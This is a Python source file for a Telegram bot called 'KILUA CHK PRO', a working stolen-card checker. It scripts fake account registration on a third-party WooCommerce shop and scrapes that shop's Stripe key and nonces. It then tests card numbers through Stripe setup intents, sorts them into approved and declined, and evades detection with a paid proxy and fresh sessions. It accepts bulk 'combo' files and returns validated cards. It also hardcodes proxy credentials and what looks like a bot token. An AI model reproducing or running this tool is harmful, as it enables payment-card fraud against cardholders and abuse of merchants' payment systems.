"""
╔══════════════════════════════════════════════════════════════╗
║         🔥  KILUA CHK PRO  —  by @o8380 / @Mustafa964       ║
║         Kilua Services · Stripe Auth Checker                 ║
║  متغيرات البيئة:                                            ║
║    BOT_TOKEN  – توكن البوت من @BotFather                   ║
║    OWNER_ID   – معرف المالك                                  ║
╚══════════════════════════════════════════════════════════════╝
"""

# ══════════════════════════════════════════════════════════════
# الاستيرادات
# ══════════════════════════════════════════════════════════════
import os, re, time, random, logging, threading
from pathlib import Path
from typing import Optional

import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ══════════════════════════════════════════════════════════════
# السجلات
# ══════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════
# الثوابت
# ══════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID  = int(os.environ.get("OWNER_ID", "6285783725"))
BOT_TAG   = "@o8380"
VERSION   = "1.0"
CREDITS   = "@o8380 · @Mustafa964 · Kilua Services"
WELCOME_VIDEO = "https://t.me/Mustafa964iq/3"

# ── البروكسي ─────────────────────────────────────────────────
PROXY_RAW  = "gr-direct.speedyhub.net:21033:ydqjeiy9smojyhnkttgec5+BYdoiLLl:jyvytnua9y"
_px        = PROXY_RAW.split(":")
PROXY_HOST = _px[0]
PROXY_PORT = _px[1]
PROXY_USER = _px[2]
PROXY_PASS = _px[3]
PROXY_URL  = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
PROXIES    = {"http": PROXY_URL, "https": PROXY_URL}

# ── المسارات ─────────────────────────────────────────────────
RESULTS_DIR = Path("results")
RESULTS_DIR.mkdir(exist_ok=True)

# ── أيقونات مخصصة (من gen ازرار الوان.py) ───────────────────
ICO_CHARGE   = "5330274810582827128"
ICO_BACK     = "5060247798616687432"
ICO_APPROVED = "5165928140404426202"
ICO_DECLINED = "5974342591552952895"
ICO_GATE     = "5059798514972754990"
ICO_BUY      = "5059910390280881178"
ICO_STARS    = "5060298809943262023"
ICO_STOP     = "5242195906199035850"
ICO_AUTH     = "5330412803587080658"
ICO_CHARGED  = "4965219701572503640"

# ══════════════════════════════════════════════════════════════
# البوت
# ══════════════════════════════════════════════════════════════
bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
try:
    bot.remove_webhook()
    time.sleep(0.5)
except Exception:
    pass

# ── حالة الفحص لكل مستخدم ────────────────────────────────────
# { uid: { "running": bool, "stats": {...}, "approved": [], "declined": [] } }
check_state: dict = {}
state_lock = threading.Lock()

def get_cs(uid: int) -> dict:
    with state_lock:
        return check_state.setdefault(uid, {})

def set_cs(uid: int, data: dict):
    with state_lock:
        check_state[uid] = data

def clear_cs(uid: int):
    with state_lock:
        check_state.pop(uid, None)

# ══════════════════════════════════════════════════════════════
# ██  Stripe Auth Checker (من ssr.py مع البروكسي)  ██
# ══════════════════════════════════════════════════════════════

class Stroxr:
    """
    فاحص Stripe Auth على موقع analyticorange.com
    - يستخدم البروكسي في كل طلب
    - يحذف الكوكيز بعد كل بطاقة (session جديدة = مستخدم جديد)
    """
    SITE = "analyticorange.com"
    UA   = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    PUA  = "stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent"

    def _headers(self) -> dict:
        return {
            "sec-ch-ua":               '"Chromium";v="137", "Not/A)Brand";v="24"',
            "sec-ch-ua-mobile":        "?1",
            "sec-ch-ua-platform":      '"Android"',
            "sec-fetch-dest":          "document",
            "sec-fetch-mode":          "navigate",
            "sec-fetch-site":          "same-origin",
            "sec-fetch-user":          "?1",
            "upgrade-insecure-requests": "1",
            "user-agent":              self.UA,
        }

    def _new_session(self) -> requests.Session:
        """session جديدة = كوكيز جديدة = مستخدم جديد"""
        s = requests.Session()
        s.proxies.update(PROXIES)
        s.headers.update(self._headers())
        return s

    def _register(self, session: requests.Session) -> requests.Session:
        email = f"usr{random.randint(10000, 99999)}{random.randint(10, 99)}@gmail.com"
        r1 = session.get(
            f"https://{self.SITE}/my-account/",
            timeout=20,
        ).text
        nonce = r1.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
        session.post(
            f"https://{self.SITE}/my-account/",
            data={
                "email":                          email,
                "password":                       "7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y",
                "wc_order_attribution_user_agent": self.UA,
                "woocommerce-register-nonce":     nonce,
                "_wp_http_referer":               "/my-account/",
                "register":                       "Register",
            },
            timeout=20,
        )
        return session

    def check(self, cc: str) -> str:
        """
        يفحص بطاقة واحدة.
        يُعيد: 'Approved' | 'Declined' | رسالة خطأ
        بعد الانتهاء: session تُحذف تلقائياً (مستخدم جديد للبطاقة التالية)
        """
        cc = cc.strip()
        parts = cc.split("|")
        if len(parts) < 4:
            return "Invalid Format"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        for attempt in range(3):
            try:
                # ── session جديدة لكل محاولة ──────────────────
                sess = self._new_session()
                sess = self._register(sess)

                # ── جلب صفحة إضافة بطاقة الدفع ───────────────
                page = sess.get(
                    f"https://{self.SITE}/my-account/add-payment-method/",
                    timeout=20,
                ).text

                pk_live   = re.search(r"(pk_live_[A-Za-z0-9_-]+)", page).group(1)
                add_nonce = page.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]

                # ── إنشاء PaymentMethod على Stripe ───────────
                pm_data = (
                    f"type=card&card[number]={n}&card[cvc]={cvc}"
                    f"&card[exp_year]={yy}&card[exp_month]={mm}"
                    f"&allow_redisplay=unspecified"
                    f"&billing_details[address][postal_code]=10080"
                    f"&billing_details[address][country]=US"
                    f"&payment_user_agent={self.PUA}&key={pk_live}"
                )
                pm_resp = sess.post(
                    "https://api.stripe.com/v1/payment_methods",
                    data=pm_data,
                    timeout=20,
                ).json()

                if "error" in pm_resp:
                    return pm_resp["error"].get("message", "Card Error")

                pm_id = pm_resp["id"]

                # ── تأكيد Setup Intent ─────────────────────────
                r5 = sess.post(
                    f"https://{self.SITE}/wp-admin/admin-ajax.php",
                    data={
                        "action":                    "wc_stripe_create_and_confirm_setup_intent",
                        "wc-stripe-payment-method":  pm_id,
                        "wc-stripe-payment-type":    "card",
                        "_ajax_nonce":               add_nonce,
                    },
                    timeout=20,
                ).text

                # ── تحليل الرد ────────────────────────────────
                if "Your card was declined" in r5 or "could not be set up" in r5:
                    return "Declined"
                elif "success" in r5.lower() or "Approved" in r5:
                    return "Approved"
                elif "incorrect" in r5.lower():
                    return "Invalid Card Number"
                elif "0" == r5.strip():
                    # Error Response → أعد المحاولة
                    time.sleep(0.5)
                    continue
                else:
                    try:
                        msg = r5.split('"message":"')[1].split('"')[0]
                        return msg if msg else "Declined"
                    except Exception:
                        return r5[:80] if r5 else "Declined"

            except requests.exceptions.ProxyError:
                logger.warning(f"Proxy error on attempt {attempt+1}")
                time.sleep(1)
                continue
            except Exception as e:
                if attempt == 2:
                    return f"Error: {str(e)[:50]}"
                time.sleep(0.5)
                continue

        return "Declined"


def check_card(cc: str) -> str:
    """واجهة موحّدة للفحص"""
    return Stroxr().check(cc)

# ══════════════════════════════════════════════════════════════
# ██  BIN Info  ██
# ══════════════════════════════════════════════════════════════

_BIN_CACHE: dict = {}

def get_bin_info(bin6: str) -> dict:
    if bin6 in _BIN_CACHE:
        return _BIN_CACHE[bin6]
    try:
        r = requests.get(
            f"https://bins.antipublic.cc/bins/{bin6}",
            timeout=6,
            proxies=PROXIES,
        ).json()
        info = {
            "brand":   r.get("brand",        "Unknown"),
            "type":    r.get("type",          "Unknown"),
            "level":   r.get("level",         "Unknown"),
            "bank":    r.get("bank",          "Unknown"),
            "country": r.get("country_name",  "Unknown"),
            "flag":    r.get("country_flag",  "🏳️"),
        }
        _BIN_CACHE[bin6] = info
        return info
    except Exception:
        return {"brand": "?", "type": "?", "level": "?",
                "bank": "?", "country": "?", "flag": "🏳️"}

def fmt_bin(bin6: str) -> str:
    b = get_bin_info(bin6)
    return (
        f"𝐁𝐢𝐧: <code>{b['brand']} - {b['type']} - {b['level']}</code>\n"
        f"𝐁𝐚𝐧𝐤: <code>{b['bank']} {b['flag']}</code>\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{b['country']} {b['flag']}</code>"
    )

# ══════════════════════════════════════════════════════════════
# ██  أدوات مساعدة  ██
# ══════════════════════════════════════════════════════════════

def mask_card(cc: str) -> str:
    """إخفاء الأرقام الحساسة: 414170xxxxxx|12|26|***"""
    try:
        p = cc.split("|")
        n = p[0]
        masked = n[:6] + "x" * (len(n) - 10) + n[-4:]
        return f"{masked}|{p[1]}|{p[2]}|***"
    except Exception:
        return cc

def progress_bar(done: int, total: int, width: int = 10) -> str:
    if total == 0:
        return "░" * width
    filled = max(0, min(width, round(width * done / total)))
    return "█" * filled + "░" * (width - filled)

def is_approved(result: str) -> bool:
    return "Approved" in result or "approved" in result.lower()

# ══════════════════════════════════════════════════════════════
# ██  لوحات المفاتيح  ██
# ══════════════════════════════════════════════════════════════

def kb_main() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup(row_width=2)
    mk.row(
        InlineKeyboardButton(
            " 🔥  Manual Check",
            callback_data="manual_hint",
            style="primary",
            icon_custom_emoji_id=ICO_AUTH,
        ),
        InlineKeyboardButton(
            " 📁  Combo Check",
            callback_data="combo_hint",
            style="success",
            icon_custom_emoji_id=ICO_BUY,
        ),
    )
    mk.row(
        InlineKeyboardButton(
            " 📊  Status",
            callback_data="status",
            style="primary",
            icon_custom_emoji_id=ICO_STARS,
        ),
        InlineKeyboardButton(
            " 🛑  Stop Check",
            callback_data="stop",
            style="danger",
            icon_custom_emoji_id=ICO_STOP,
        ),
    )
    mk.add(
        InlineKeyboardButton(
            " 🏠  Home",
            callback_data="home",
            style="primary",
            icon_custom_emoji_id=ICO_BACK,
        )
    )
    return mk

def kb_stop() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup()
    mk.add(
        InlineKeyboardButton(
            " 🛑  Stop Check",
            callback_data="stop",
            style="danger",
            icon_custom_emoji_id=ICO_STOP,
        )
    )
    return mk

def kb_home() -> InlineKeyboardMarkup:
    mk = InlineKeyboardMarkup()
    mk.add(
        InlineKeyboardButton(
            " 🏠  Home",
            callback_data="home",
            style="primary",
            icon_custom_emoji_id=ICO_BACK,
        )
    )
    return mk

# ══════════════════════════════════════════════════════════════
# ██  نصوص  ██
# ══════════════════════════════════════════════════════════════

def txt_welcome(name: str) -> str:
    return (
        f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
        f"┃      🔥 KILUA CHK PRO 🔥      ┃\n"
        f"┃   {BOT_TAG} · v{VERSION}          ┃\n"
        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"✨ أهلاً بك يا <b>{name}</b> ✨\n\n"
        f"┌──────────────────────────┐\n"
        f"│  📌 /chk CC|MM|YY|CVV  ← فحص يدوي\n"
        f"│  📁 أرسل ملف .txt  ← فحص كومبو\n"
        f"└──────────────────────────┘\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Kilua Services · <code>{BOT_TAG}</code>"
    )

def build_progress(
    done: int, total: int,
    approved: int, declined: int,
    current: str, response: str,
    elapsed: float,
    running: bool = True,
) -> tuple:
    """
    يُعيد (text, InlineKeyboardMarkup)
    — كل عنصر في شاشة الفحص يصير زر ملون —
    """
    pct  = round(done / total * 100) if total else 0
    bar  = progress_bar(done, total)
    resp_short = response[:40] if len(response) > 40 else response

    # ── النص العلوي (بسيط) ───────────────────────────────
    text = (
        f"<b>🔥 KILUA CHECKER</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{current}</code>"
    )

    # ── الأزرار الملونة ───────────────────────────────────
    mk = InlineKeyboardMarkup(row_width=2)

    # صف 1: شريط التقدم
    mk.add(InlineKeyboardButton(
        f"📊  [{bar}]  {pct}%  ({done}/{total})",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_STARS,
    ))

    # صف 2: Approved | Declined
    mk.row(
        InlineKeyboardButton(
            f"✅  Approved: {approved}",
            callback_data="ignore",
            style="success",
            icon_custom_emoji_id=ICO_APPROVED,
        ),
        InlineKeyboardButton(
            f"❌  Declined: {declined}",
            callback_data="ignore",
            style="danger",
            icon_custom_emoji_id=ICO_DECLINED,
        ),
    )

    # صف 3: Response
    mk.add(InlineKeyboardButton(
        f"📝  {resp_short}",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_AUTH,
    ))

    # صف 4: Time
    mk.add(InlineKeyboardButton(
        f"⏱  Time: {elapsed:.2f}s",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_CHARGE,
    ))

    # صف 5: Stop
    if running:
        mk.add(InlineKeyboardButton(
            " 🛑  Stop Check",
            callback_data="stop",
            style="danger",
            icon_custom_emoji_id=ICO_STOP,
        ))

    return text, mk

def build_approved_msg(cc: str, result: str, elapsed: float) -> tuple:
    """يُعيد (text, keyboard) — كل تفاصيل البطاقة الموافق عليها أزرار ملونة"""
    bin6 = cc.split("|")[0][:6]
    b    = get_bin_info(bin6)

    text = f"<tg-emoji emoji-id='{ICO_APPROVED}'>✅</tg-emoji> <b>#Stripe_Auth  APPROVED</b>"

    mk = InlineKeyboardMarkup(row_width=1)

    # البطاقة
    mk.add(InlineKeyboardButton(
        f"💳  {cc}",
        callback_data="ignore",
        style="success",
        icon_custom_emoji_id=ICO_CHARGED,
    ))

    # الرد
    mk.add(InlineKeyboardButton(
        f"📝  {result[:50]}",
        callback_data="ignore",
        style="success",
        icon_custom_emoji_id=ICO_APPROVED,
    ))

    # الوقت
    mk.add(InlineKeyboardButton(
        f"⏱  Time: {elapsed:.2f}s",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_CHARGE,
    ))

    # BIN info
    mk.add(InlineKeyboardButton(
        f"🏦  {b['brand']} · {b['type']} · {b['level']}",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_GATE,
    ))
    mk.add(InlineKeyboardButton(
        f"🏛  {b['bank']}  {b['flag']}",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_AUTH,
    ))
    mk.add(InlineKeyboardButton(
        f"🌍  {b['country']}  {b['flag']}",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_STARS,
    ))

    # Credits
    mk.add(InlineKeyboardButton(
        f"🏷  {CREDITS}",
        callback_data="ignore",
        style="primary",
        icon_custom_emoji_id=ICO_BACK,
    ))

    return text, mk

# ══════════════════════════════════════════════════════════════
# ██  منطق الفحص الكومبو  ██
# ══════════════════════════════════════════════════════════════

def _combo_worker(uid: int, chat_id: int, msg_id: int, cards: list):
    """
    يعمل في thread منفصل.
    - كل بطاقة → session جديدة = مستخدم جديد = كوكيز جديدة
    - يحدّث شاشة التقدم كل بطاقة
    - يوقف عند stop_flag
    """
    total    = len(cards)
    approved = []
    declined = []
    ap_count = 0
    dc_count = 0

    set_cs(uid, {"running": True, "approved": [], "declined": [], "total": total})

    for i, cc in enumerate(cards, 1):
        # ── تحقق من إشارة الإيقاف ─────────────────────────
        cs = get_cs(uid)
        if not cs.get("running", True):
            break

        cc = cc.strip()
        if not cc or "|" not in cc:
            dc_count += 1
            continue

        start = time.time()
        try:
            result = check_card(cc)
        except Exception as e:
            result = f"Error: {e}"
        elapsed = time.time() - start

        if is_approved(result):
            ap_count += 1
            approved.append(cc)
            # إرسال رسالة الموافقة (كلها أزرار ملونة)
            try:
                _ap_txt, _ap_mk = build_approved_msg(cc, result, elapsed)
                bot.send_message(
                    chat_id,
                    _ap_txt,
                    parse_mode="HTML",
                    reply_markup=_ap_mk,
                )
            except Exception:
                pass
        else:
            dc_count += 1
            declined.append(cc)

        # ── تحديث شاشة التقدم (كل شيء أزرار) ──────────
        try:
            _cs_now = get_cs(uid)
            _running = _cs_now.get("running", True)
            _txt, _mk = build_progress(
                i, total, ap_count, dc_count,
                mask_card(cc), result, elapsed,
                running=_running,
            )
            bot.edit_message_text(
                _txt, chat_id, msg_id,
                parse_mode="HTML",
                reply_markup=_mk,
            )
        except Exception:
            pass

        # ── حفظ الحالة ───────────────────────────────────
        cs = get_cs(uid)
        cs["approved"] = approved
        cs["declined"] = declined
        set_cs(uid, cs)

    # ── حفظ النتائج ──────────────────────────────────────
    cs = get_cs(uid)
    stopped = not cs.get("running", True)

    ap_file = RESULTS_DIR / f"{uid}_approved.txt"
    dc_file = RESULTS_DIR / f"{uid}_declined.txt"

    if approved:
        ap_file.write_text("\n".join(approved), encoding="utf-8")
    if declined:
        dc_file.write_text("\n".join(declined), encoding="utf-8")

    # ── ملخص نهائي ───────────────────────────────────────
    status_icon = "🛑 Stopped" if stopped else "✅ Completed"
    final = (
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{status_icon}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total: <code>{total}</code>\n"
        f"✅ Approved: <code>{ap_count}</code>\n"
        f"❌ Declined: <code>{dc_count}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💫 {BOT_TAG}"
    )

    try:
        bot.edit_message_text(
            final, chat_id, msg_id,
            parse_mode="HTML",
            reply_markup=kb_home(),
        )
    except Exception:
        pass

    # ── إرسال ملفات النتائج ───────────────────────────────
    if approved and ap_file.exists():
        try:
            with open(ap_file, "rb") as f:
                bot.send_document(
                    chat_id, f,
                    caption=f"✅ <b>Approved Cards</b> — {ap_count}",
                    parse_mode="HTML",
                    visible_file_name="approved.txt",
                )
        except Exception:
            pass

    clear_cs(uid)

# ══════════════════════════════════════════════════════════════
# ██  معالجات الأوامر  ██
# ══════════════════════════════════════════════════════════════

@bot.message_handler(commands=["start"])
def cmd_start(message):
    uid  = message.from_user.id
    name = message.from_user.first_name or "User"
    clear_cs(uid)

    try:
        sent = bot.send_video(
            message.chat.id,
            WELCOME_VIDEO,
            caption=txt_welcome(name),
            parse_mode="HTML",
            reply_markup=kb_main(),
        )
    except Exception:
        # إذا فشل الفيديو → رسالة نصية
        bot.send_message(
            message.chat.id,
            txt_welcome(name),
            parse_mode="HTML",
            reply_markup=kb_main(),
        )

@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    uid = message.from_user.id
    cs  = get_cs(uid)
    if cs.get("running"):
        cs["running"] = False
        set_cs(uid, cs)
        bot.reply_to(message, "🛑 <b>Check stopped.</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, "ℹ️ No active check.", parse_mode="HTML")

@bot.message_handler(commands=["status"])
def cmd_status(message):
    uid = message.from_user.id
    cs  = get_cs(uid)
    if not cs:
        bot.reply_to(message,
            "━━━━━━━━━━━━━━━━━━\n📊 <b>Status</b>\n━━━━━━━━━━━━━━━━━━\nNo active check.\n━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML")
        return
    total = cs.get("total", 0)
    ap    = len(cs.get("approved", []))
    dc    = len(cs.get("declined", []))
    done  = ap + dc
    bot.reply_to(message,
        f"━━━━━━━━━━━━━━━━━━\n📊 <b>Status</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"📦 Total: <code>{total}</code>\n"
        f"✅ Approved: <code>{ap}</code>\n"
        f"❌ Declined: <code>{dc}</code>\n"
        f"📊 Done: <code>{done}/{total}</code>\n"
        f"━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
    )

# ── فحص يدوي /chk ─────────────────────────────────────────

@bot.message_handler(commands=["chk"])
def cmd_chk(message):
    uid  = message.from_user.id
    text = message.text.strip()

    # استخراج البطاقة
    parts = text.split(maxsplit=1)
    if len(parts) < 2 or "|" not in parts[1]:
        bot.reply_to(
            message,
            "❌ الصيغة الصحيحة:\n<code>/chk NUM|MM|YY|CVV</code>",
            parse_mode="HTML",
        )
        return

    cc   = parts[1].strip()
    prog = bot.reply_to(
        message,
        f"🔄 <b>Checking...</b>\n<code>{mask_card(cc)}</code>",
        parse_mode="HTML",
    )

    def _do():
        start   = time.time()
        result  = check_card(cc)
        elapsed = time.time() - start
        bin6    = cc.split("|")[0][:6]

        if is_approved(result):
            # بطاقة موافق عليها → أزرار خضراء
            _txt, _mk = build_approved_msg(cc, result, elapsed)
        else:
            # بطاقة مرفوضة → أزرار حمراء
            b = get_bin_info(bin6)
            _txt = f"<tg-emoji emoji-id='{ICO_DECLINED}'>❌</tg-emoji> <b>#Stripe_Auth  DECLINED</b>"
            _mk  = InlineKeyboardMarkup(row_width=1)
            _mk.add(InlineKeyboardButton(
                f"💳  {cc}",
                callback_data="ignore", style="danger",
                icon_custom_emoji_id=ICO_DECLINED,
            ))
            _mk.add(InlineKeyboardButton(
                f"📝  {result[:50]}",
                callback_data="ignore", style="danger",
                icon_custom_emoji_id=ICO_STOP,
            ))
            _mk.add(InlineKeyboardButton(
                f"⏱  Time: {elapsed:.2f}s",
                callback_data="ignore", style="primary",
                icon_custom_emoji_id=ICO_CHARGE,
            ))
            _mk.add(InlineKeyboardButton(
                f"🏦  {b['brand']} · {b['type']} · {b['level']}",
                callback_data="ignore", style="primary",
                icon_custom_emoji_id=ICO_GATE,
            ))
            _mk.add(InlineKeyboardButton(
                f"🌍  {b['country']}  {b['flag']}",
                callback_data="ignore", style="primary",
                icon_custom_emoji_id=ICO_STARS,
            ))
            _mk.add(InlineKeyboardButton(
                f"🏷  {CREDITS}",
                callback_data="ignore", style="primary",
                icon_custom_emoji_id=ICO_BACK,
            ))
        try:
            bot.edit_message_text(
                _txt, prog.chat.id, prog.message_id,
                parse_mode="HTML",
                reply_markup=_mk,
            )
        except Exception:
            pass

        # حفظ في approved.txt
        if is_approved(result):
            ap_file = RESULTS_DIR / f"{uid}_approved.txt"
            with open(ap_file, "a", encoding="utf-8") as f:
                f.write(cc + "\n")

    threading.Thread(target=_do, daemon=True).start()

# ── فحص كومبو (ملف txt) ───────────────────────────────────

@bot.message_handler(content_types=["document"])
def handle_doc(message):
    uid = message.from_user.id
    doc = message.document

    if not doc or not doc.file_name.lower().endswith(".txt"):
        bot.reply_to(message,
            "❌ أرسل ملف <code>.txt</code> فقط.",
            parse_mode="HTML")
        return

    cs = get_cs(uid)
    if cs.get("running"):
        bot.reply_to(message,
            "⚠️ يوجد فحص جارٍ، أوقفه أولاً بـ /stop",
            parse_mode="HTML")
        return

    prog = bot.send_message(
        message.chat.id,
        "🔄 <b>Loading combo...</b>",
        parse_mode="HTML",
    )

    try:
        fi  = bot.get_file(doc.file_id)
        raw = bot.download_file(fi.file_path)
        lines = [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines()
                 if l.strip() and "|" in l]
    except Exception as e:
        bot.edit_message_text(
            f"❌ فشل التحميل: <code>{e}</code>",
            message.chat.id, prog.message_id,
            parse_mode="HTML",
        )
        return

    if not lines:
        bot.edit_message_text(
            "❌ لا توجد بطاقات صالحة في الملف.",
            message.chat.id, prog.message_id,
            parse_mode="HTML",
        )
        return

    bot.edit_message_text(
        f"✅ <b>{len(lines)}</b> بطاقة — بدأ الفحص...",
        message.chat.id, prog.message_id,
        parse_mode="HTML",
        reply_markup=kb_stop(),
    )

    threading.Thread(
        target=_combo_worker,
        args=(uid, message.chat.id, prog.message_id, lines),
        daemon=True,
    ).start()

# ══════════════════════════════════════════════════════════════
# ██  معالجات الأزرار  ██
# ══════════════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda c: c.data == "home")
def cb_home(call):
    uid  = call.from_user.id
    name = call.from_user.first_name or "User"
    bot.answer_callback_query(call.id)
    try:
        bot.edit_message_text(
            txt_welcome(name),
            call.message.chat.id,
            call.message.message_id,
            parse_mode="HTML",
            reply_markup=kb_main(),
        )
    except Exception:
        bot.send_message(
            call.message.chat.id,
            txt_welcome(name),
            parse_mode="HTML",
            reply_markup=kb_main(),
        )

@bot.callback_query_handler(func=lambda c: c.data == "stop")
def cb_stop(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id, "🛑 Stopping...")
    cs = get_cs(uid)
    if cs.get("running"):
        cs["running"] = False
        set_cs(uid, cs)
    else:
        bot.answer_callback_query(call.id, "ℹ️ No active check.", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "manual_hint")
def cb_manual_hint(call):
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "📌 <b>Manual Check</b>\n\n"
        "أرسل الأمر:\n"
        "<code>/chk NUM|MM|YY|CVV</code>\n\n"
        "مثال:\n"
        "<code>/chk 4111111111111111|08|26|123</code>",
        parse_mode="HTML",
    )

@bot.callback_query_handler(func=lambda c: c.data == "combo_hint")
def cb_combo_hint(call):
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "📁 <b>Combo Check</b>\n\n"
        "أرسل ملف <code>.txt</code> يحتوي على البطاقات\n"
        "(كل بطاقة في سطر بالصيغة: <code>NUM|MM|YY|CVV</code>)",
        parse_mode="HTML",
    )

@bot.callback_query_handler(func=lambda c: c.data == "status")
def cb_status(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id)
    cs  = get_cs(uid)

    if not cs:
        bot.send_message(
            call.message.chat.id,
            "━━━━━━━━━━━━━━━━━━\n📊 <b>Status</b>\n━━━━━━━━━━━━━━━━━━\nNo active check.\n━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )
        return

    total = cs.get("total", 0)
    ap    = len(cs.get("approved", []))
    dc    = len(cs.get("declined", []))
    done  = ap + dc
    run   = "🟢 Running" if cs.get("running") else "🔴 Stopped"

    bot.send_message(
        call.message.chat.id,
        f"━━━━━━━━━━━━━━━━━━\n📊 <b>Status</b>\n━━━━━━━━━━━━━━━━━━\n"
        f"⚙️ State: {run}\n"
        f"📦 Total: <code>{total}</code>\n"
        f"✅ Approved: <code>{ap}</code>\n"
        f"❌ Declined: <code>{dc}</code>\n"
        f"📊 Done: <code>{done}/{total}</code>\n"
        f"━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
        reply_markup=kb_home(),
    )

@bot.callback_query_handler(func=lambda c: c.data == "ignore")
def cb_ignore(call):
    bot.answer_callback_query(call.id)

# ══════════════════════════════════════════════════════════════
# ██  main  ██
# ══════════════════════════════════════════════════════════════

def main():
    logger.info("═" * 55)
    logger.info(f"  🔥  KILUA CHK PRO v{VERSION} — {BOT_TAG}")
    logger.info(f"  🌐  Proxy: {PROXY_HOST}:{PROXY_PORT}")
    logger.info("═" * 55)

    while True:
        try:
            bot.infinity_polling(
                timeout=30,
                skip_pending=True,
                long_polling_timeout=20,
            )
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
